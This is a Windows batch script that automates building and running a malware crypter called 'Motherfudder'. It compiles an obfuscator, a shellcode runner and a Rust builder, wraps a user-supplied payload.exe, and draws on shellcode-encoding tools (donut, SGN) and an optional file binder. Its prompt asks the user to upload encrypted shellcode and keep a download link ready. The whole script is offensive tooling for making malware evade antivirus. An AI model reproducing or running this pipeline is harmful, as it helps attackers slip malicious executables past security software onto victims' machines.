@echo off
setlocal enabledelayedexpansion

echo ========================================
echo    Motherfudder Automated Crypter
echo ========================================
echo.

REM Check if payload.exe exists
if not exist "payload.exe" (
    echo [ERROR] payload.exe not found in current directory!
    echo Please place your payload.exe in the same directory as this script.
    pause
    exit /b 1
)

echo [*] Checking prerequisites...

REM Check for Visual Studio/MSBuild
where msbuild >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] MSBuild not found. Please ensure Visual Studio is installed.
    echo Trying to find MSBuild automatically...
    set "MSBUILD_PATH="
    for /f "tokens=*" %%i in ('dir /s /b "C:\Program Files\Microsoft Visual Studio\*\MSBuild\Current\Bin\MSBuild.exe" 2^>nul') do set "MSBUILD_PATH=%%i"
    if "!MSBUILD_PATH!"=="" (
        echo [ERROR] Could not find MSBuild. Please install Visual Studio with .NET Framework 4.8.
        pause
        exit /b 1
    )
) else (
    for /f "delims=" %%i in ('where msbuild') do set "MSBUILD_PATH=%%i"
)

echo [+] Found MSBuild: !MSBUILD_PATH!

REM Check for Rust/Cargo
where cargo >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Cargo not found. Please ensure Rust is installed.
    pause
    exit /b 1
)
echo [+] Found Cargo

REM Check for Donut and SGN (optional but recommended)
set "DONUT_EXE="
set "SGN_EXE="
set "KEYSTONE_DLL="

if exist "donut.exe" (
    set "DONUT_EXE=donut.exe"
    echo [+] Found donut.exe
) else (
    echo [!] Warning: donut.exe not found. Required for native payloads.
)

if exist "sgn.exe" (
    set "SGN_EXE=sgn.exe"
    echo [+] Found sgn.exe
) else (
    echo [!] Warning: sgn.exe not found. Required for native payloads.
)

if exist "keystone.dll" (
    set "KEYSTONE_DLL=keystone.dll"
    echo [+] Found keystone.dll
) else (
    echo [!] Warning: keystone.dll not found. Required for native payloads.
)

echo.
echo [*] Step 1: Building MfObfDotNet...
pushd "%~dp0MfObfDotNet"
if not exist "MfObfDotNet.sln" (
    echo [ERROR] MfObfDotNet.sln not found!
    popd
    pause
    exit /b 1
)

"%MSBUILD_PATH%" MfObfDotNet.sln /p:Configuration=Release /p:Platform="Any CPU" /m /nologo /v:minimal
if %errorlevel% neq 0 (
    echo [ERROR] Failed to build MfObfDotNet!
    popd
    pause
    exit /b 1
)
echo [+] MfObfDotNet built successfully!
popd

echo.
echo [*] Step 2: Building MfRunner...
pushd "%~dp0MfBuilder\MfRunner"
if not exist "MfRunner.sln" (
    echo [ERROR] MfRunner.sln not found!
    popd
    pause
    exit /b 1
)

REM Build both x64 and x86 versions
"%MSBUILD_PATH%" MfRunner.sln /p:Configuration=Release /p:Platform=x64 /m /nologo /v:minimal
if %errorlevel% neq 0 (
    echo [ERROR] Failed to build MfRunner x64!
    popd
    pause
    exit /b 1
)

"%MSBUILD_PATH%" MfRunner.sln /p:Configuration=Release /p:Platform=x86 /m /nologo /v:minimal
if %errorlevel% neq 0 (
    echo [ERROR] Failed to build MfRunner x86!
    popd
    pause
    exit /b 1
)
echo [+] MfRunner built successfully!
popd

echo.
echo [*] Step 3: Building MfBuilder...
pushd "%~dp0MfBuilder"
if not exist "Cargo.toml" (
    echo [ERROR] Cargo.toml not found!
    popd
    pause
    exit /b 1
)

cargo build --release
if %errorlevel% neq 0 (
    echo [ERROR] Failed to build MfBuilder!
    popd
    pause
    exit /b 1
)
echo [+] MfBuilder built successfully!
popd

echo.
echo [*] Step 4: Setting up working directory...
set "WORK_DIR=%~dp0crypt_work"
if exist "%WORK_DIR%" (
    echo [*] Cleaning existing work directory...
    rmdir /s /q "%WORK_DIR%"
)
mkdir "%WORK_DIR%"

REM Copy necessary files
echo [*] Copying files...
copy "%~dp0MfBuilder\target\release\MfBuilder.exe" "%WORK_DIR%\" >nul
copy "%~dp0MfBuilder\build.json" "%WORK_DIR%\" >nul
copy "%~dp0payload.exe" "%WORK_DIR%\" >nul

REM Find and copy MfObfDotNet.exe
set "OBF_EXE="
for /r "%~dp0MfObfDotNet" %%f in (MfObfDotNet.exe) do (
    if exist "%%f" set "OBF_EXE=%%f"
)
if not "!OBF_EXE!"=="" (
    copy "!OBF_EXE!" "%WORK_DIR%\" >nul
    echo [+] Copied MfObfDotNet.exe
) else (
    echo [!] Warning: Could not find MfObfDotNet.exe
)

REM Find and copy MfRunner.exe (both x64 and x86)
set "RUNNER_X64="
set "RUNNER_X86="
for /r "%~dp0MfBuilder\MfRunner" %%f in (MfRunner.exe) do (
    if /i "%%~dpf"=*x64\Release\* (
        set "RUNNER_X64=%%f"
    )
    if /i "%%~dpf"=*x86\Release\* (
        set "RUNNER_X86=%%f"
    )
)
if not "!RUNNER_X64!"=="" (
    copy "!RUNNER_X64!" "%WORK_DIR%\MfRunner_x64.exe" >nul
    echo [+] Copied MfRunner x64
)
if not "!RUNNER_X86!"=="" (
    copy "!RUNNER_X86!" "%WORK_DIR%\MfRunner_x86.exe" >nul
    echo [+] Copied MfRunner x86
)

REM Copy Donut and SGN if they exist
if not "!DONUT_EXE!"=="" (
    copy "!DONUT_EXE!" "%WORK_DIR%\" >nul
    echo [+] Copied donut.exe
)

if not "!SGN_EXE!"=="" (
    copy "!SGN_EXE!" "%WORK_DIR%\" >nul
    echo [+] Copied sgn.exe
)

if not "!KEYSTONE_DLL!"=="" (
    copy "!KEYSTONE_DLL!" "%WORK_DIR%\" >nul
    echo [+] Copied keystone.dll
)

REM Check if bind.exe exists (for binder feature)
if exist "bind.exe" (
    copy "bind.exe" "%WORK_DIR%\" >nul
    echo [+] Copied bind.exe
)

echo.
echo [*] Step 5: Running MfBuilder...
echo.
echo [!] Make sure you have uploaded your encrypted shellcode and have the download link ready!
echo.
pushd "%WORK_DIR%"
MfBuilder.exe
set "BUILD_RESULT=%errorlevel%"
popd

echo.
if %BUILD_RESULT% equ 0 (
    echo [+] Build completed successfully!
    echo [+] Output files are in: %WORK_DIR%
    echo.
    echo [*] Cleaning up temporary files...
    REM Optionally clean up - comment out if you want to keep the work directory
    REM rmdir /s /q "%WORK_DIR%"
) else (
    echo [ERROR] Build failed with error code %BUILD_RESULT%
    echo Work directory preserved at: %WORK_DIR%
)

echo.
echo ========================================
pause
